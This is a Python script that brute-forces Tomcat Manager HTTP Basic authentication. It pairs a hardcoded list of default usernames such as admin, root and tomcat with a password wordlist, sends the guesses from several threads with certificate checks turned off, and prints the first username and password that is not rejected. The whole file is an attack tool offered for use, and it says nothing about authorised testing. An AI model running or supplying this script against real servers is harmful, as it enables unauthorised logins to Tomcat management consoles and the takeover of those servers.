#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import base64
import sys
import queue
import threading
import time
import random
import argparse
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
password_base64 = queue.Queue()
count = 2
#PROXS = {'http': '127.0.0.1:8080'}
def get_cheek_pass(url,dicts):
	result = {}
	username = ["admin","root","manager","role1","tomcat","both","j2deployer","j2deployer","ovwebusr","owaspbwa","kdsxc"]
	for name in username:
		with open(dicts, "r", encoding='ISO-8859-1') as f:
			for password in f:
				pass_str = name.strip() + ":" + password.strip()
				base64_str = base64.b64encode(pass_str.encode('utf-8')).decode("utf-8")
				password_base64.put(base64_str)
	print("use %d threading"%(count))
	print("[+] --- startig tomcat cheek ---")
	mutex = threading.Lock()
	thread_pool = []
	for _ in range(1, int(count)):
		t = threading.Thread(target=cheek_tomcat, args=(url, password_base64,mutex,result))
		t.start()
		thread_pool.append(t)
	for i in thread_pool:
		i.join()
	print(result)
def cheek_tomcat(url,password_base64,mutex,result):

	while True:
		basic = password_base64.get()
		mutex.acquire()
		if password_base64.empty():
			mutex.release()
			result.update({"fail": "Hei NOt find passwd."})
			return
		time.sleep(0.01)
		mutex.release()
		msg = base64.b64decode(basic.encode("utf-8")).decode("utf-8")
		print("[-] error: " + msg)
		headers = {
			"Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
			"User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
			"Content-Type": "application/x-www-form-urlencoded",
			'Authorization': 'Basic %s' % basic
		}
		#req = requests.get(url, headers=headers,proxies=PROXS,timeout=5)
		req = requests.get(url, headers=headers,timeout=10, verify=False)
		if req.status_code != 401:
			result.update({"success": str(req.status_code) + "[+]username/password: " + msg})
			password_base64.queue.clear()
			return True
		
	return
if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', type=str, help='tomcat url Target')
	parser.add_argument('-p', type=str, help='password file')
	args = parser.parse_args()
	url = args.t
	dicts = args.p
	get_cheek_pass(url,dicts)
